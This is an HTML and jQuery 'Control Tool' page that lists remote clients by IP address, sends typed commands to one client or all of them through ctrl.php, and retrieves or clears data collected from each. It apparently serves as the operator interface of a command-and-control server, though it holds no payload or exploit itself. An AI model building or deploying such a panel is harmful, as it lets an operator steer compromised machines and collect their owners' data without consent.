<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>Control Tool</title>
		<style>
textarea {
	display: block;
	width: 100%;
	min-height: 150px;
}
		</style>
		<script src="jquery-2.1.3.min.js"></script>
		<script>

var ctrl = 'ctrl.php';

var l_users = [];
var l_selected = -1;

var $selected_user = null;
var $users = null;
var $cmd = null;
var $data = null;
var $log = null;

function log(msg) {
	$log.get(0).value += msg + '\n';
	$log.scrollTop($log[0].scrollHeight);
}
function refresh_users() {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'json',
		data: {req : 'get_users'}
	})
	.done(function(data) {
		l_users = data;
		$users.empty();
		for (var i = 0; i < l_users.length; i++) {
			$users.append($('<tr></tr>')
				.append('<td><button onclick="select_user('+i+')">' + l_users[i] + '</button></td>'));
		}
		log('Fetched ' + l_users.length + ' IP addresses.');
	});
}

function select_user(index) {
	l_selected = index;
	if (index < 0) {
		$selected_user.html('Selected: ALL');
	} else {
		$selected_user.html('Selected: ' + l_users[index]);
	}
}
function get_data() {
	if (l_selected < 0) {
		$data.val('Select user first.');
		return;
	}
	
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : 'get_data', user: l_users[l_selected]}
	})
	.done(function(data) {
		$data.val(data);
		log('Fetched data for ' + l_users[l_selected]);
	});
}
function clear_data() {
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: {req : 'clear_data', user: l_users[l_selected]}
	})
	.done(function(data) {
		$data.val('');
		log('Cleared data for ' + l_users[l_selected]);
	});
}
function run() {
	var cmd = $cmd.val();
	if (cmd.length == 0)
		return;
		
	$cmd.val('');
	
	var data = null;
	if (l_selected < 0) {
		data = {req : 'put_cmd_all', cmd: cmd};
	} else {
		data = {req : 'put_cmd', cmd: cmd, user: l_users[l_selected]};
	}
	
	$.ajax({
		type: 'POST',
		url: ctrl,
		cache: false,
		dataType: 'text',
		data: data
	})
	.done(function(data) {
		log('Executed command for '
			+ (l_selected < 0 ? 'ALL' : l_users[l_selected])
			+ '. ' + data);
	});
}

$(document).ready(function() {
	$selected_user = $('#selected_user');
	$users = $('#users');
	$cmd = $('#cmd');
	$data = $('#data');
	$log = $('#log');
	
	refresh_users();
	select_user(-1);
});

		</script>
	</head>
	<body>
		<button onclick="refresh_users()">Refresh Users</button>
		<button onclick="select_user(-1)">Select All</button>
		<div id="selected_user"></div>
		<table id="users"></table>
		
		<textarea id="cmd"></textarea>
		<button onclick="run()" onkeypress="">Run</button>
		
		<textarea id="data" readonly="readonly"></textarea>
		<button onclick="get_data()">Get data</button>
		<button onclick="clear_data()">Clear data</button>
		
		<textarea id="log" readonly="readonly"></textarea>
	</body>
</html>